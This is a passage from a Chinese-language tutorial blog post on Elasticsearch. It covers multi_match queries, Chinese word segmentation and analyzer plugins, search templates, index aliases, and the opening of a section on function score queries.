class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">DELETE titles</span><br><span class="line">PUT /titles</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">    <span class="attr">"properties"</span>: &#123;</span><br><span class="line">      <span class="attr">"title"</span>:&#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"text"</span>,</span><br><span class="line">        <span class="attr">"analyzer"</span>: <span class="string">"english"</span>,</span><br><span class="line">        <span class="attr">"fields"</span>: &#123;</span><br><span class="line">          <span class="attr">"std"</span>:&#123;</span><br><span class="line">            <span class="attr">"type"</span>:<span class="string">"text"</span>,</span><br><span class="line">            <span class="attr">"analyzer"</span>:<span class="string">"standard"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">POST titles/_bulk</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">1</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"title"</span>:<span class="string">"My dog barks"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">2</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"title"</span>:<span class="string">"I see a lot of barking dogs on the road "</span>&#125;</span><br><span class="line"><span class="comment">//multi_match 查询</span></span><br><span class="line">GET titles/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"multi_match"</span>: &#123;</span><br><span class="line">      <span class="attr">"query"</span>: <span class="string">"barking dogs"</span>,</span><br><span class="line">      <span class="attr">"type"</span>: <span class="string">"most_fields"</span>, <span class="comment">//默认是best_fields</span></span><br><span class="line">      <span class="attr">"fields"</span>: [<span class="string">"title"</span>,<span class="string">"title.std"</span>]<span class="comment">//累计叠加</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回</span></span><br><span class="line">"hits" : [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"_index"</span> : <span class="string">"titles"</span>,</span><br><span class="line">        <span class="attr">"_type"</span> : <span class="string">"_doc"</span>,</span><br><span class="line">        <span class="attr">"_id"</span> : <span class="string">"2"</span>,</span><br><span class="line">        <span class="attr">"_score"</span> : <span class="number">1.4569323</span>,</span><br><span class="line">        <span class="attr">"_source"</span> : &#123;</span><br><span class="line">          <span class="attr">"title"</span> : <span class="string">"I see a lot of barking dogs on the road "</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"_index"</span> : <span class="string">"titles"</span>,</span><br><span class="line">        <span class="attr">"_type"</span> : <span class="string">"_doc"</span>,</span><br><span class="line">        <span class="attr">"_id"</span> : <span class="string">"1"</span>,</span><br><span class="line">        <span class="attr">"_score"</span> : <span class="number">0.42221838</span>,</span><br><span class="line">        <span class="attr">"_source"</span> : &#123;</span><br><span class="line">          <span class="attr">"title"</span> : <span class="string">"My dog barks"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><h3 id="使用多字段匹配解决"><a href="#使用多字段匹配解决" class="headerlink" title="使用多字段匹配解决"></a>使用多字段匹配解决</h3><ul><li>用广度匹配字段 title 包括尽可能多的文档 - 以提高召回率 ，同时又使用字段 title.std 作为信息将相关度更高的文档结至于文档顶部</li><li>每个字段对于最终评分的贡献可以通过自定义值 boost 来控制。比如，使 title 字段更为重要，这样同时也降低了其他信号字段的作用</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET titles/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"multi_match"</span>: &#123;</span><br><span class="line">      <span class="attr">"query"</span>: <span class="string">"barking dogs"</span>,</span><br><span class="line">      <span class="attr">"type"</span>: <span class="string">"most_fields"</span>, </span><br><span class="line">      <span class="attr">"fields"</span>: [<span class="string">"title^10"</span>,<span class="string">"title.std"</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="跨字段搜索"><a href="#跨字段搜索" class="headerlink" title="跨字段搜索"></a>跨字段搜索</h3><ul><li>most_fields 无法使用 opeartor<ul><li>可以用 copy_to 解决，但是需要额外的储存空间</li></ul></li><li>cross_fields 可以支持 operator<ul><li>与 copy_to 相比，其中一个优势就是可以在搜索时为某个字段提升权重</li></ul></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">PUT address/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"street"</span>:<span class="string">"5 Poland Street"</span>,</span><br><span class="line">  <span class="attr">"city"</span> : <span class="string">"Lodon"</span>,</span><br><span class="line">  <span class="attr">"country"</span>:<span class="string">"United Kingdom"</span>,</span><br><span class="line">  <span class="attr">"postcode"</span> : <span class="string">"W1V 3DG"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST address/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>:&#123;</span><br><span class="line">    <span class="attr">"multi_match"</span>: &#123;</span><br><span class="line">      <span class="attr">"query"</span>: <span class="string">"Poland Street W1V"</span>,</span><br><span class="line">      <span class="attr">"type"</span>: <span class="string">"cross_fields"</span>,  <span class="comment">//most_fields查询为空</span></span><br><span class="line">      <span class="attr">"operator"</span>: <span class="string">"and"</span>, </span><br><span class="line">      <span class="attr">"fields"</span>: [<span class="string">"street"</span>,<span class="string">"city"</span>,<span class="string">"country"</span>,<span class="string">"postcode"</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">"hits" : [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"_index"</span> : <span class="string">"address"</span>,</span><br><span class="line">        <span class="attr">"_type"</span> : <span class="string">"_doc"</span>,</span><br><span class="line">        <span class="attr">"_id"</span> : <span class="string">"1"</span>,</span><br><span class="line">        <span class="attr">"_score"</span> : <span class="number">0.8630463</span>,</span><br><span class="line">        <span class="attr">"_source"</span> : &#123;</span><br><span class="line">          <span class="attr">"street"</span> : <span class="string">"5 Poland Street"</span>,</span><br><span class="line">          <span class="attr">"city"</span> : <span class="string">"Lodon"</span>,</span><br><span class="line">          <span class="attr">"country"</span> : <span class="string">"United Kingdom"</span>,</span><br><span class="line">          <span class="attr">"postcode"</span> : <span class="string">"W1V 3DG"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><h2 id="多语言及中文分词与检索"><a href="#多语言及中文分词与检索" class="headerlink" title="多语言及中文分词与检索"></a>多语言及中文分词与检索</h2><h3 id="自然语言与查询-Recall"><a href="#自然语言与查询-Recall" class="headerlink" title="自然语言与查询 Recall"></a>自然语言与查询 Recall</h3><ul><li>当处理人类自然语言时，有些情况，尽管搜索和原文不完全匹配，但是希望搜到一些内容<ul><li>Quick brown fox 和 fast brown fox / Jumping fox 和 Jumped foxes</li></ul></li><li>一些可采取的优化<ul><li>归一化词元：清除变音符号，如 rÔle 的的时候 也会匹配 role</li><li>抽取词根：清除单复数和时态的差异</li><li>包含同义词</li><li>拼写错误：拼写错误，或者同音异形词</li></ul></li></ul><h3 id="混合多语言的挑战"><a href="#混合多语言的挑战" class="headerlink" title="混合多语言的挑战"></a>混合多语言的挑战</h3><ul><li>一些具体的多语言场景<ul><li>不同的索引使用不同的语言 / 同一索引中，不同的字段使用不同的语言 / 一个文档的一个字段内混合不同的语言</li></ul></li><li>混合语言存在的一些挑战<ul><li>词干提取：以色列文档，包含了希伯来语，阿拉伯语，俄语和英文</li><li>不争取的文档频率 - 英文为主的文章中，德文算分高（稀有）</li><li>需要判断用户搜索时使用的语言，语言识别（Compact Language Detecor）<ul><li>例如，根据语言查询不同的索引</li></ul></li></ul></li></ul><h3 id="分词的挑战"><a href="#分词的挑战" class="headerlink" title="分词的挑战"></a>分词的挑战</h3><ul><li>英文分词：You’re 分成一个还是多个？Half-baked</li><li>中文分词<ul><li>分词的标椎：哈工大标椎中，姓和名分开。HanLP 是在一起的。具体情况需制定不同的标椎</li><li>歧义（组合型歧义，交际型歧义，真歧义）<ul><li>中华人民共和国 / 美国会通过对台收武器法案 / 上海仁和服装厂</li></ul></li></ul></li></ul><h3 id="中文分词方法的演变-字典法"><a href="#中文分词方法的演变-字典法" class="headerlink" title="中文分词方法的演变 - 字典法"></a>中文分词方法的演变 - 字典法</h3><ul><li>查字典 - 最容易想到的分词方法（北京航空大学的梁南元教授提出）<ul><li>一个句子从左到到右扫描一遍。遇到有点词就标识出来。找到复合词，就找最长的</li><li>不认识的字符串就分割成单字词</li></ul></li><li>最小词数的分词理论 - 哈工大王晓龙博士吧查字典的方法理论化<ul><li>一句话应该分词数量最少的词串</li><li>遇到二义性的分割，无能为力（例如：“发展中国家”/“上海大学城书店”）</li><li>用各种文化规则来解决二义性，都并不成功</li></ul></li></ul><h3 id="中文分词方法的演变-基于统计法的机器学习算法"><a href="#中文分词方法的演变-基于统计法的机器学习算法" class="headerlink" title="中文分词方法的演变 - 基于统计法的机器学习算法"></a>中文分词方法的演变 - 基于统计法的机器学习算法</h3><ul><li>统计语言模型 - 1990 年前后 ，清华大学电子工程系郭进博士<ul><li>解决了二义性问题，将中文分词的错误率降低了一个数据级。概率问题，动态规划 + 利用维特比算法快速找到最佳分词</li></ul></li><li>基于统计的机器学习算法<ul><li>这类目前常用的算法是 HMM、CRF、SVM、深度学习算法等算法。比如 Hanlp 分词工具是基于 CRF 算法为例，基本思路是对汉字进行标注训练，不仅考虑了词语出现的频率，还考虑上下文，具有较好的学习能力，因此其对歧义词和未登录词的识别都具有良好的下效果</li><li>随着深度学习的兴起，也出现了基于神经网路的分词器，有人尝试使用双向 LSTM + CRF 实现分词器，其本质上是序列标注，据报道其分词器字符准确率可高达 97.5%</li></ul></li></ul><h3 id="中文分词器现状"><a href="#中文分词器现状" class="headerlink" title="中文分词器现状"></a>中文分词器现状</h3><ul><li>中文分词器以统计语言模型为基础，经过几十年的发展，今天基本已经可以看做是一个已经解决的问题</li><li>不同分词器的好坏，主要的差别在于数据的使用和工程使用的精度</li><li>常见的分词器都是使用机器学期算法和词典相结合，一方面能够提高分词准确率，另一方面能够改善领域适应性</li></ul><h3 id="一些分词工具"><a href="#一些分词工具" class="headerlink" title="一些分词工具"></a>一些分词工具</h3><ul><li>Elasticsearch IK分词插件 <a href="https://github.com/medcl/elasticsearch-analysis-ik/releases" target="_blank" rel="noopener">https://github.com/medcl/elasticsearch-analysis-ik/releases</a></li><li>Elasticsearch HanLP 分词插件 <a href="https://github.com/KennFalcon/elasticsearch-analysis-hanlp" target="_blank" rel="noopener">https://github.com/KennFalcon/elasticsearch-analysis-hanlp</a></li><li>中科院计算所NLPIR <a href="http://ictclas.nlpir.org/nlpir/" target="_blank" rel="noopener">http://ictclas.nlpir.org/nlpir/</a></li><li>ansj分词器 <a href="https://github.com/NLPchina/ansj_seg" target="_blank" rel="noopener">https://github.com/NLPchina/ansj_seg</a></li><li>哈工大的LTP <a href="https://github.com/HIT-SCIR/ltp" target="_blank" rel="noopener">https://github.com/HIT-SCIR/ltp</a></li><li>清华大学THULAC <a href="https://github.com/thunlp/THULAC" target="_blank" rel="noopener">https://github.com/thunlp/THULAC</a></li><li>斯坦福分词器 <a href="https://nlp.stanford.edu/software/segmenter.shtml" target="_blank" rel="noopener">https://nlp.stanford.edu/software/segmenter.shtml</a></li><li>Hanlp分词器 <a href="https://github.com/hankcs/HanLP" target="_blank" rel="noopener">https://github.com/hankcs/HanLP</a></li><li>结巴分词 <a href="https://github.com/yanyiwu/cppjieba" target="_blank" rel="noopener">https://github.com/yanyiwu/cppjieba</a></li><li>KCWS分词器(字嵌入+Bi-LSTM+CRF) <a href="https://github.com/koth/kcws" target="_blank" rel="noopener">https://github.com/koth/kcws</a></li><li>ZPar <a href="https://github.com/frcchang/zpar/releases" target="_blank" rel="noopener">https://github.com/frcchang/zpar/releases</a></li><li>IKAnalyzer <a href="https://github.com/wks/ik-analyzer" target="_blank" rel="noopener">https://github.com/wks/ik-analyzer</a></li></ul><h3 id="中文分词-DEMO"><a href="#中文分词-DEMO" class="headerlink" title="中文分词 DEMO"></a>中文分词 DEMO</h3><ul><li>使用不同分词器测试效果</li><li>索引时，尽量切分的短，查询的时候，尽量用长的词</li><li>拼音分词器</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装插件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># IK Analysis - 支持字典热更新</span></span><br><span class="line">bin/elasticsearch-plugin install https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v7.1.0/elasticsearch-analysis-ik-7.1.0.zip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拼音</span></span><br><span class="line">bin/elasticsearch install https://github.com/medcl/elasticsearch-analysis-pinyin/releases/download/v7.1.0/elasticsearch-analysis-pinyin-7.1.0.zip</span><br><span class="line"></span><br><span class="line"><span class="comment"># HanLP - 支持加载远程字典</span></span><br><span class="line">bin/elasticsearch install https://github.com/KennFalcon/elasticsearch-analysis-hanlp/releases/download/v7.1.0/elasticsearch-analysis-hanlp-7.1.0.zip</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ik_max_word</span></span><br><span class="line"><span class="comment">// ik_smart</span></span><br><span class="line"><span class="comment">// hanlp: hanlp默认分词</span></span><br><span class="line"><span class="comment">// hanlp_standard: 标准分词</span></span><br><span class="line"><span class="comment">// hanlp_index: 索引分词</span></span><br><span class="line"><span class="comment">// hanlp_nlp: NLP分词</span></span><br><span class="line"><span class="comment">// hanlp_n_short: N-最短路分词</span></span><br><span class="line"><span class="comment">// hanlp_dijkstra: 最短路分词</span></span><br><span class="line"><span class="comment">// hanlp_crf: CRF分词（在hanlp 1.6.6已开始废弃）</span></span><br><span class="line"><span class="comment">// hanlp_speed: 极速词典分词</span></span><br><span class="line"></span><br><span class="line">POST _analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"analyzer"</span>: <span class="string">"hanlp_standard"</span>,</span><br><span class="line">  <span class="attr">"text"</span>: [<span class="string">"剑桥分析公司多位高管对卧底记者说，他们确保了唐纳德·特朗普在总统大选中获胜"</span>]</span><br><span class="line">&#125;     </span><br><span class="line"></span><br><span class="line"><span class="comment">// Pinyin</span></span><br><span class="line">PUT /artists/</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"settings"</span> : &#123;</span><br><span class="line">        <span class="attr">"analysis"</span> : &#123;</span><br><span class="line">            <span class="attr">"analyzer"</span> : &#123;</span><br><span class="line">                <span class="attr">"user_name_analyzer"</span> : &#123;</span><br><span class="line">                    <span class="attr">"tokenizer"</span> : <span class="string">"whitespace"</span>,</span><br><span class="line">                    <span class="attr">"filter"</span> : <span class="string">"pinyin_first_letter_and_full_pinyin_filter"</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"filter"</span> : &#123;</span><br><span class="line">                <span class="attr">"pinyin_first_letter_and_full_pinyin_filter"</span> : &#123;</span><br><span class="line">                    <span class="attr">"type"</span> : <span class="string">"pinyin"</span>,</span><br><span class="line">                    <span class="attr">"keep_first_letter"</span> : <span class="literal">true</span>,</span><br><span class="line">                    <span class="attr">"keep_full_pinyin"</span> : <span class="literal">false</span>,</span><br><span class="line">                    <span class="attr">"keep_none_chinese"</span> : <span class="literal">true</span>,</span><br><span class="line">                    <span class="attr">"keep_original"</span> : <span class="literal">false</span>,</span><br><span class="line">                    <span class="attr">"limit_first_letter_length"</span> : <span class="number">16</span>,</span><br><span class="line">                    <span class="attr">"lowercase"</span> : <span class="literal">true</span>,</span><br><span class="line">                    <span class="attr">"trim_whitespace"</span> : <span class="literal">true</span>,</span><br><span class="line">                    <span class="attr">"keep_none_chinese_in_first_letter"</span> : <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET /artists/_analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"text"</span>: [<span class="string">"刘德华 张学友 郭富城 黎明 四大天王"</span>],</span><br><span class="line">  <span class="attr">"analyzer"</span>: <span class="string">"user_name_analyzer"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">curl -XPOST http://localhost:9200/index/_mapping -H 'Content-Type:application/json' -d &#123;</span><br><span class="line">  "properties": &#123;</span><br><span class="line">    "content": &#123;</span><br><span class="line">      "type": "text",</span><br><span class="line">      "analyzer": "ik_max_word",</span><br><span class="line">      "search_analyzer" : "ik_smart"</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="测试相关性一理解原理-＋-多分析-＋-多调整测试"><a href="#测试相关性一理解原理-＋-多分析-＋-多调整测试" class="headerlink" title="测试相关性一理解原理 ＋ 多分析 ＋ 多调整测试"></a>测试相关性一理解原理 ＋ 多分析 ＋ 多调整测试</h2><ul><li>技术分为道和术两种<ul><li>道 一 原理和原则</li><li>术 一 具体的做法，具体的解法</li></ul></li><li>关于搜索，为了有一个好的搜索结果。除了真正理解背后的原理，更需要多加实践与分析<ul><li>单纯追求”术”，会一直很辛苦。只有掌握了本质和精髓之”道”，做事才能游刃有余</li><li>要做好搜索，除了理解原理，也需要坚持去分析一些不好的搜索结果。只有通过一定时间的积累，<br>才能真正有所感觉</li><li>总希望一个模型，一个算法，就能毕其功于一役，是不现实的</li></ul></li></ul><h3 id="监控并且理解用户行为"><a href="#监控并且理解用户行为" class="headerlink" title="监控并且理解用户行为"></a>监控并且理解用户行为</h3><ul><li>不要过度调试相关度</li><li>而要监控搜索结果，监控用户点击最顶端结果的频次</li><li>将搜索结果提高到极高水平，唯一途径就是<ul><li>需要具有度量用户行为的强大能力</li><li>可以在后台实现统计数据，比如，用户的查询和结果，有多少被点击了</li><li>哪些搜索，没有返回结果</li></ul></li></ul><h2 id="使用-Search-Template-和-Index-Alias"><a href="#使用-Search-Template-和-Index-Alias" class="headerlink" title="使用 Search Template 和 Index Alias"></a>使用 Search Template 和 Index Alias</h2><h3 id="Search-Template-解耦程序-amp-搜索-DSL"><a href="#Search-Template-解耦程序-amp-搜索-DSL" class="headerlink" title="Search Template - 解耦程序 &amp; 搜索 DSL"></a>Search Template - 解耦程序 &amp; 搜索 DSL</h3><ul><li>Elasticsearch 的查询语句<ul><li>对相关性算分 / 查询性能都至关重要</li></ul></li><li>在开发初期，虽然可以明确查询参数，但是往往还不能最终定义查询的 DSL 的具体结构<ul><li>通过 Search Template 定义一个 Contract</li></ul></li><li>各司其职，解耦<ul><li>开发人员 / 搜索工程师 / 性能工程师</li></ul></li></ul><h3 id="使用-Search-Template-进行查询"><a href="#使用-Search-Template-进行查询" class="headerlink" title="使用 Search Template 进行查询"></a>使用 Search Template 进行查询</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">DELETE _scripts/tmdb</span><br><span class="line"><span class="comment">// 定义模板</span></span><br><span class="line">POST _scripts/tmdb</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"script"</span>: &#123;</span><br><span class="line">    <span class="attr">"lang"</span>: <span class="string">"mustache"</span>,</span><br><span class="line">    <span class="attr">"source"</span>: &#123;</span><br><span class="line">      <span class="attr">"_source"</span>: [</span><br><span class="line">        <span class="string">"title"</span>,<span class="string">"overview"</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"size"</span>: <span class="number">20</span>,</span><br><span class="line">      <span class="attr">"query"</span>: &#123;</span><br><span class="line">        <span class="attr">"multi_match"</span>: &#123;</span><br><span class="line">          <span class="attr">"query"</span>: <span class="string">"&#123;&#123;q&#125;&#125;"</span>,</span><br><span class="line">          <span class="attr">"fields"</span>: [<span class="string">"title"</span>,<span class="string">"overview"</span>]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET _scripts/tmdb</span><br><span class="line"></span><br><span class="line">POST tmdb/_search/template</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"id"</span>:<span class="string">"tmdb"</span>,</span><br><span class="line">    <span class="attr">"params"</span>: &#123;</span><br><span class="line">        <span class="attr">"q"</span>: <span class="string">"basketball with cartoon aliens"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用-Index-Alias-实现零停机运维"><a href="#使用-Index-Alias-实现零停机运维" class="headerlink" title="使用 Index Alias 实现零停机运维"></a>使用 Index Alias 实现零停机运维</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">PUT movies-2019/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>:<span class="string">"the matrix"</span>,</span><br><span class="line">  <span class="attr">"rating"</span>:<span class="number">5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT movies-2019/_doc/2</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>:<span class="string">"Speed"</span>,</span><br><span class="line">  <span class="attr">"rating"</span>:<span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST _aliases</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"actions"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"add"</span>: &#123;</span><br><span class="line">        <span class="attr">"index"</span>: <span class="string">"movies-2019"</span>,</span><br><span class="line">        <span class="attr">"alias"</span>: <span class="string">"movies-latest"</span> <span class="comment">// 为索引创建个别名</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过别名读写数据</span></span><br><span class="line">POST movies-latest/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match_all"</span>: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用-Alias-创建不同查询的视图"><a href="#使用-Alias-创建不同查询的视图" class="headerlink" title="使用 Alias 创建不同查询的视图"></a>使用 Alias 创建不同查询的视图</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST _aliases</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"actions"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"add"</span>: &#123;</span><br><span class="line">        <span class="attr">"index"</span>: <span class="string">"movies-2019"</span>,</span><br><span class="line">        <span class="attr">"alias"</span>: <span class="string">"movies-lastest-highrate"</span>,</span><br><span class="line">        <span class="attr">"filter"</span>: &#123;</span><br><span class="line">          <span class="attr">"range"</span>: &#123;</span><br><span class="line">            <span class="attr">"rating"</span>: &#123;</span><br><span class="line">              <span class="attr">"gte"</span>: <span class="number">4</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST movies-lastest-highrate/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match_all"</span>: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="综合排序-Function-Score-Query-优化算分"><a href="#综合排序-Function-Score-Query-优化算分" class="headerlink" title="综合排序 Function Score Query 优化算分"></a>综合排序 Function Score Query 优化算分</h2><h3 id="算分与排序"><a href="#算分与排序" class="headerlink" title="算分与排序"></a>算分与排序</h3><ul><li>ES 